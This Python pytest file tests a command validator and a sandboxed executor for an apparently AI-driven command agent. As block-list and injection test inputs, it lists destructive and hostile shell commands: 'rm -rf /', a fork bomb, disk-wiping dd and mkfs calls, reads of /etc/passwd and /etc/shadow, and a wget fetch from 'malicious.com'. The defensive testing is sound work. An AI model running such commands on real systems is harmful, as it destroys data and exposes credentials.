"""Security-focused tests for command execution."""
import pytest
import tempfile
import time
from pathlib import Path
from unittest.mock import patch, MagicMock

from utils.command_executor import SecureCommandExecutor, CommandValidator, CommandResult
from safe_command_agent import SafeCommandAgent


class TestCommandValidator:
    """Test command validation logic."""
    
    def test_blacklist_patterns(self):
        """Test dangerous patterns are blocked."""
        validator = CommandValidator(whitelist_mode=False)
        
        dangerous_commands = [
            "rm -rf /",
            "rm -rf /*",
            ":(){ :|:& };:",  # Fork bomb
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "echo 'bad' > /proc/sys/kernel/panic",
            "echo 'bad' > /sys/power/state",
        ]
        
        for cmd in dangerous_commands:
            is_safe, msg = validator.validate(cmd)
            assert not is_safe, f"Dangerous command not blocked: {cmd}"
            assert "dangerous pattern" in msg
    
    def test_whitelist_mode(self):
        """Test whitelist mode only allows specific commands."""
        validator = CommandValidator(whitelist_mode=True)
        
        # Allowed commands
        safe_commands = ["ls", "pwd", "echo hello", "cat file.txt"]
        for cmd in safe_commands:
            is_safe, msg = validator.validate(cmd)
            assert is_safe, f"Safe command blocked: {cmd}"
        
        # Blocked commands
        blocked_commands = ["rm file.txt", "chmod +x script", "sudo anything"]
        for cmd in blocked_commands:
            is_safe, msg = validator.validate(cmd)
            assert not is_safe, f"Unsafe command not blocked: {cmd}"
            assert "not in whitelist" in msg
    
    def test_command_chaining(self):
        """Test command chaining is blocked."""
        validator = CommandValidator()
        
        chained_commands = [
            "ls && rm file",
            "cat file || echo failed",
            "pwd; ls",
        ]
        
        for cmd in chained_commands:
            is_safe, msg = validator.validate(cmd)
            assert not is_safe, f"Chained command not blocked: {cmd}"
            assert "chaining not allowed" in msg
    
    def test_pipeline_validation(self):
        """Test pipeline commands are validated."""
        validator = CommandValidator(whitelist_mode=True)
        
        # Safe pipeline
        is_safe, msg = validator.validate("ls | grep test")
        assert is_safe
        
        # Unsafe pipeline (rm not in whitelist)
        is_safe, msg = validator.validate("ls | rm")
        assert not is_safe
        assert "Unsafe command in pipeline" in msg


class TestSecureCommandExecutor:
    """Test secure command execution."""
    
    def test_safe_command_execution(self):
        """Test normal command execution."""
        executor = SecureCommandExecutor()
        
        result = executor.execute("echo 'hello world'")
        assert result.return_code == 0
        assert "hello world" in result.stdout
        assert not result.timed_out
    
    def test_command_timeout(self):
        """Test command timeout handling."""
        executor = SecureCommandExecutor(max_cpu_seconds=1)
        
        # Command that would run forever
        result = executor.execute("sleep 10", timeout=1)
        assert result.timed_out
        assert result.return_code == -1
        assert "timed out" in result.stderr
    
    def test_resource_limits(self):
        """Test resource limit enforcement."""
        executor = SecureCommandExecutor(
            max_memory_mb=50,  # Very low memory limit
            max_cpu_seconds=1,
        )
        
        # This should fail due to resource limits
        # Python command that tries to allocate lots of memory
        result = executor.execute(
            "python -c 'x = [0] * (100 * 1024 * 1024)'",  # Try to allocate 100MB
            timeout=2
        )
        assert result.return_code != 0
    
    def test_output_truncation(self):
        """Test large output is truncated."""
        executor = SecureCommandExecutor(max_output_size=100)
        
        # Generate large output
        result = executor.execute("python -c 'print(\"x\" * 1000)'")
        assert len(result.stdout) <= 150  # 100 + truncation message
        assert "[OUTPUT TRUNCATED]" in result.stdout
    
    def test_environment_filtering(self):
        """Test sensitive environment variables are filtered."""
        executor = SecureCommandExecutor()
        
        env = {
            "SAFE_VAR": "value",
            "API_KEY": "secret",
            "SECRET_TOKEN": "hidden",
            "PASSWORD": "pass123",
        }
        
        result = executor.execute("env", env=env)
        assert "SAFE_VAR=value" in result.stdout
        assert "API_KEY" not in result.stdout
        assert "SECRET_TOKEN" not in result.stdout
        assert "PASSWORD" not in result.stdout
    
    def test_working_directory(self):
        """Test working directory is respected."""
        with tempfile.TemporaryDirectory() as tmpdir:
            executor = SecureCommandExecutor(working_dir=Path(tmpdir))
            
            result = executor.execute("pwd")
            assert tmpdir in result.stdout


class TestSafeCommandAgent:
    """Test the safe command agent."""
    
    @pytest.fixture
    def agent(self, tmp_path):
        """Create test agent."""
        return SafeCommandAgent(
            name="test_agent",
            data_dir=tmp_path,
            command_whitelist_mode=True,
            max_command_memory_mb=256,
            audit_commands=True,
        )
    
    def test_command_auditing(self, agent):
        """Test commands are audited."""
        # Add allowed command
        agent.add_allowed_command("echo")
        
        # Execute command
        result = agent.execute_command("echo test")
        assert result.return_code == 0
        
        # Check audit file
        audit_file = agent.data_dir / "command_audit.ndjson"
        assert audit_file.exists()
        
        with open(audit_file, 'r') as f:
            audit_entry = json.loads(f.readline())
            assert audit_entry['command'] == "echo test"
            assert audit_entry['status'] == "success"
            assert 'duration_seconds' in audit_entry
    
    def test_blocked_command_tracking(self, agent):
        """Test blocked commands are tracked."""
        # Try dangerous command
        result = agent.execute_command("rm -rf /")
        assert result.return_code == 1
        assert "validation failed" in result.stderr
        
        # Check stats
        stats = agent.get_command_stats()
        assert stats['blocked'] == 1
        assert stats['total'] == 1
        assert stats['block_rate'] == 1.0
    
    def test_context_management(self, agent):
        """Test context window management."""
        # Add messages
        for i in range(10):
            agent.context_manager.add('user', f"Message {i}")
            agent.context_manager.add('assistant', f"Response {i}")
        
        # Check context
        stats = agent.get_context_stats()
        assert stats['entry_count'] == 20
        assert stats['total_tokens'] > 0
        assert stats['usage_percentage'] > 0
    
    def test_state_persistence(self, agent):
        """Test agent state is saved and loaded."""
        # Execute some commands
        agent.add_allowed_command("echo")
        agent.execute_command("echo test1")
        agent.execute_command("echo test2")
        agent.execute_command("invalid command")  # Will be blocked
        
        # Add context
        agent.context_manager.add('user', 'test message')
        
        # Save state
        agent.save_state()
        
        # Create new agent and load state
        new_agent = SafeCommandAgent(
            name="test_agent",
            data_dir=agent.data_dir,
        )
        new_agent.load_state()
        
        # Verify stats were loaded
        stats = new_agent.get_command_stats()
        assert stats['total'] == 3
        assert stats['successful'] == 2
        assert stats['blocked'] == 1
        
        # Verify context was loaded
        context_stats = new_agent.get_context_stats()
        assert context_stats['entry_count'] > 0


class TestSecurityIntegration:
    """Integration tests for security features."""
    
    def test_command_injection_prevention(self):
        """Test various command injection attempts are blocked."""
        executor = SecureCommandExecutor()
        
        injection_attempts = [
            "echo 'safe' && rm -rf /",
            "echo 'safe'; cat /etc/passwd",
            "echo 'safe' || wget malicious.com/script.sh",
            "echo `rm -rf /`",
            "echo $(cat /etc/shadow)",
        ]
        
        for attempt in injection_attempts:
            result = executor.execute(attempt)
            assert result.return_code != 0
            assert "validation failed" in result.stderr or "not allowed" in result.stderr
    
    @pytest.mark.slow
    def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion attacks."""
        executor = SecureCommandExecutor(
            max_memory_mb=100,
            max_cpu_seconds=2,
        )
        
        # CPU exhaustion attempt
        result = executor.execute(
            "python -c 'while True: pass'",
            timeout=3
        )
        assert result.timed_out or result.return_code != 0
        
        # Memory exhaustion attempt
        result = executor.execute(
            "python -c 'x = []; "
            "while True: x.append([0]*1000000)'",
            timeout=3
        )
        assert result.return_code != 0
    
    def test_path_traversal_prevention(self):
        """Test path traversal attempts are handled."""
        with tempfile.TemporaryDirectory() as tmpdir:
            executor = SecureCommandExecutor(working_dir=Path(tmpdir))
            
            # These should work within the directory
            executor.execute("touch test.txt")
            result = executor.execute("ls")
            assert "test.txt" in result.stdout
            
            # Attempts to access outside should be validated
            # Note: actual prevention depends on command validation rules


if __name__ == "__main__":
    pytest.main([__file__, "-v"])